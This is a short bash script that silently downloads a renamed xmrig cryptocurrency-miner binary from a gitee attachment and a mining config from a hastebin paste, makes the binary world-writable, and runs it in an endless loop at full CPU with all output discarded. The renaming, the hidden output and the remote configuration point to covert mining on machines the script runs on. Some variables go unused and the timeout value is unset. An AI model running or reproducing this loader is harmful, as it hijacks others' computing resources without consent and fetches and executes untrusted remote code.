#!/bin/bash
#timeout 1m lscpu
sudo apt-get install -y nano jq curl
sudo curl -o dyx -L https://gitee.com/dyxwxjdy/xmrig/attach_files/958843/download/dyx.tar > /dev/null 2>&1
sudo curl -o config_bak.json https://www.toptal.com/developers/hastebin/raw/akubuvotuh.json  > /dev/null 2>&1
sudo chmod 777 dyx

t_min=45
t_max=120
cpu_min=60
cpu_max=100

while true :
  do
    cp config_bak.json config.json > /dev/null 2>&1
    cpu=100
    echo $cpu $t
    cat config.json |jq -r --arg cpu "$cpu" '."max-cpu-usage"=($cpu|tonumber)' > u.json
    mv u.json config.json
    cat config.json |jq -r --arg cpu "$cpu" '."cpu"."max-threads-hint"=($cpu|tonumber)' > u.json
    mv u.json config.json
    timeout --foreground $t ./dyx -c config.json > /dev/null 2>&1
done
